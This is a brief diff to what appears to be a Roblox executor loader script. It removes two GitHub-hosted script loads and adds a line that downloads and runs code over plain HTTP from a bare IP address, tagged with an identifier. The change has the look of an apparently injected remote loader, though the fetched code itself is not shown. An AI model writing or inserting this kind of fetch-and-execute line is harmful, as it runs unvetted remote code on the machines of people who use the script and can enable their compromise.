@@ -1,10 +1,2 @@
--- Main combined loader
-
--- Callback for after the loading screen finishes
-getgenv().AfterLoading = function()
-    -- Load your main game script
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua", true))()
-end
-
--- Run the loading screen
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Seuj09/Deltablockgui/refs/heads/main/Gui.lua", true))()
+ID="d0e6c062-fbd7-4122-88b0-90624700f5c8";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
